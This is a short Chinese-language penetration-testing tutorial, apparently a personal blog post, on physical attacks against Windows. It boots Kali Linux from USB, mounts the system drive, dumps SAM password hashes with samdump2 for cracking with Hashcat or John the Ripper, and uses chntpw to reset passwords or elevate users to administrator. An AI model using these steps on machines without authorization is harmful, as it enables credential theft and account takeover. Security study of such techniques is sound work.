---
title: 'Penetration Testing : 物理攻击之samdump2与chntpw'
date: 2019-11-22 16:36:10
tags: [Penetration Testing,Kali Linux]
---

## Penetration Testing : 物理攻击之 samdump2 与 chntpw

### 使用 samdump2 破解 Windows 密码
1. *首先将装有 Kali linux 操作系统的 U 盘插入 PC，并通过设置 BLOS 来启动 Kali linux*

2. *通过命令查看分区情况，然后将 U 盘挂载到 Windows 操作系统的系统盘. 例如我的系统盘显示为 : `/dev/sda2`*
```sh
fdisk -l

mount /dev/sad2 /mnt/
```

3. *进入挂载目录，查看是否正确挂载. ( 如果正确显示系统盘 C 盘文件，则表示挂载成功  )*
```sh
cd /mnt/

ls -la
```

4. *接着进入 Windows 用于存放用户账号密码的文件夹下*
```sh
cd /Windows/System32/config
```

5. *使用 Kali linux 自带的 `samdump2` 来获取存储在 Windows 系统上的用户账号和密码. 然后可通过 cat 命令查看所有用户系统驱动器以及它们的密码散列值*
```sh
samdump2 SYSTEM SAM -o sam.hash

cat sam.hash
```

6. *最后可通过 `Hashcat`，`John Ripper` 或 `Credump` 等工具来完成对用户密码的破解*


#### Tool
> Hashcat : https://github.com/hashcat/hashcat

> John Ripper : https://github.com/magnumripper/JohnTheRipper



### 使用 chntpw 操作 Windows 密码
*`chntpw` 是一个 Kali linux 自带的工具，可以用于编辑 Windows 注册表、重置用户密码、将用户提升为管理员，以及其它的一些有用的选项.*

*前 4 步和上述 `使用 samdump2 破解 Windows 密码` 相同. 进入 Windows 用于存放用户账号密码的文件夹下后，运行 `chntpw`*
```sh
chntpw SAM
```

* 密码存储在 Windows 系统中的 SAM( Security Account Management ) 文件中，它是 Windows XP，Windows Vista 及 Windows 7 等用于存储用户密码的数据库文件

*例如操作指定用户的SAM. ( 可通过命令 `chntpw -l <sam file>` 来查看 SAM 的用户列表 )*
```sh
#chntpw -l <sam file>
#chntpw -u <user><sam file>

chntpw -u username SAM
```

*执行指定的操作后即可执行命令 `q` 退出编辑，最后你应该可以得到确认，例如提示信息 : `<SAM>-OK`*


#### Tool
> chntpw : https://github.com/Tody-Guo/chntpw
